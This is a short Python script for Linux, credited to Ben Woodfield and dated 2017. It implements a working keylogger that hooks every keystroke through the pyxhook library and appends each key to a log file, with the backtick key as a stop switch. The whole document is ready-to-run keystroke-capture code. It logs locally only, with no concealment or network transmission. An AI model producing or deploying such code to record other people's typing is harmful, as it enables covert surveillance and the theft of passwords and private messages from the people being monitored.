# Ben Woodfield - 07/12/2017
# Python Keylogger - Written for Linux systems

# All keypresses are saved in a file called outputfile.log
# If you re-run this script the new keystrokes are added to the existing file
# (^^^ Uses Append not Write ^^^)
# Kill the program with (`) key

import pyxhook

#change this to your output log file's location
log_file='/Your_File_Path/outputfile.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')
  if event.Ascii==96: #` key
    fob.close() # if ` is pressed, kill program"
    new_hook.cancel()
    
#instantiate HookManager class
new_hook=pyxhook.HookManager()

#listen to all keystrokes
new_hook.KeyDown=OnKeyPress

#hook the keyboard
new_hook.HookKeyboard()

#start the session
new_hook.start()
